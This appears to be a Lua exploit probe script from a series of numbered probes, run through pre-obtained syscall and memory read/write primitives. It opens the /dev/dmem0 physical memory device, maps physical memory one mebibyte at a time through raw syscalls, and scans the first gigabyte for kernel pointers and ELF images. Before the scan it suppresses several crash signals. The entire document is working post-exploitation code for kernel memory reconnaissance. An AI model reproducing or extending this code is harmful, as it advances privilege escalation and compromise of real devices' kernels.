-- CRASH_CLASS: LOW
-- PROBE 528r: Scan physical memory 1 MiB at a time
--
-- Previous probes timed out on large mmap windows.
-- 528l proved: 16 MiB mmap works (1 MiB also worked).
-- Strategy: map 1 MiB, read 64 samples (one per 16KB page), unmap.
-- 64 reads per MiB × however many MiB fit in the timeout.
-- Target: 0-1 GB = 1024 iterations.

print("=== PROBE 528r: 1-MIB SCAN ===")
print("")

local function N(v)
    if type(v) == "table" and v.tonumber then return v:tonumber() end
    return tonumber(v) or 0
end
local function mk(n)
    local t = {}; for k, v in pairs(syscall.pipe) do t[k] = v end
    t.syscall_no = n; setmetatable(t, getmetatable(syscall.pipe)); return t
end
local function get_hi_lo(val)
    if type(val) == "table" and val.h then return val.h, val.l end
    return 0, N(val)
end
local function wd(a, v) pcall(function() memory.write_dword(a, v) end) end
local function wq(a, v) pcall(function() memory.write_qword(a, v) end) end
local function rd(a)
    local ok, v = pcall(function() return memory.read_dword(a) end)
    if ok then return N(v) end return nil
end
local function rq(a)
    local ok, v = pcall(function() return memory.read_qword(a) end)
    if ok then return v end return nil
end

local stub = syscall.pipe.fn_addr
local pid = N(native.fcall_with_rax(stub, 20))
print("pid=" .. pid)

local sa_buf = memory.alloc(0x20)
wq(N(sa_buf), uint64(1))
for _, sig in ipairs({10, 11, 12, 13}) do
    pcall(function() mk(416)(uint64(sig), sa_buf, uint64(0)) end)
end

local devpath = memory.alloc(0x20)
local dname = "/dev/dmem0"
for i = 1, #dname do wd(N(devpath) + i - 1, string.byte(dname, i)) end
wd(N(devpath) + #dname, 0)
local fd = N(native.fcall_with_rax(stub, 5, uint64(N(devpath)), uint64(2), uint64(0)))
print("fd=" .. fd)
if fd < 0 or fd > 200 then print("BAD FD"); return end

local sc_477 = mk(477)
local sc_73 = mk(73)
local PAGE = 0x4000       -- 16 KB
local MIB = 0x100000      -- 1 MiB
local PAGES_PER_MIB = MIB / PAGE  -- 64

local kptr_mibs = {}
local elf_hits = {}

-- Scan 0-1 GB
local max_scan = 0x40000000  -- 1 GB
local mib_count = 0

for mib_off = 0, max_scan - MIB, MIB do
    mib_count = mib_count + 1

    local phi = math.floor(mib_off / 0x100000000)
    local plo = mib_off % 0x100000000
    local phys = uint64(string.format("0x%X%08X", phi, plo))

    local ok_m, rv_m = pcall(function()
        return sc_477(uint64(0), uint64(MIB), uint64(1), uint64(1), uint64(fd), phys)
    end)

    if not ok_m or not rv_m then break end
    local rh, rl = get_hi_lo(rv_m)
    if rh < 0 then rh = rh + 0x100000000 end
    if rh == 0xFFFFFFFF then
        -- mmap failed — beyond accessible range
        break
    end

    local va = N(rv_m)
    local kcount = 0

    for p = 0, PAGES_PER_MIB - 1 do
        local v = rq(va + p * PAGE)
        if v then
            local vh, vl = get_hi_lo(v)
            if vh < 0 then vh = vh + 0x100000000 end
            if vl < 0 then vl = vl + 0x100000000 end
            if vh >= 0xFFFF8000 and vh < 0xFFFFFFFF then
                kcount = kcount + 1
            end
        end
        -- Check ELF on first dword
        local d = rd(va + p * PAGE)
        if d then
            if d < 0 then d = d + 0x100000000 end
            if d == 0x464C457F then
                local phys_page = mib_off + p * PAGE
                table.insert(elf_hits, phys_page)
            end
        end
    end

    if kcount > 0 then
        table.insert(kptr_mibs, {mib_off, kcount})
    end

    -- Unmap
    pcall(function() sc_73(rv_m, uint64(MIB)) end)

    -- Progress every 128 MiB
    if mib_count % 128 == 0 then
        print(string.format("  %d MiB: %d kptr regions, %d ELFs",
            mib_count, #kptr_mibs, #elf_hits))
    end
end

print("")
print("scanned: " .. mib_count .. " MiB")
print("ELF pages: " .. #elf_hits)
for _, p in ipairs(elf_hits) do
    print(string.format("  phys 0x%X", p))
end
print("kptr MiBs: " .. #kptr_mibs)
table.sort(kptr_mibs, function(a, b) return a[2] > b[2] end)
for i = 1, math.min(20, #kptr_mibs) do
    print(string.format("  phys 0x%X: %d kptrs/64pages", kptr_mibs[i][1], kptr_mibs[i][2]))
end

pcall(function() native.fcall_with_rax(stub, 6, uint64(fd)) end)
print("=== 528r DONE ===")
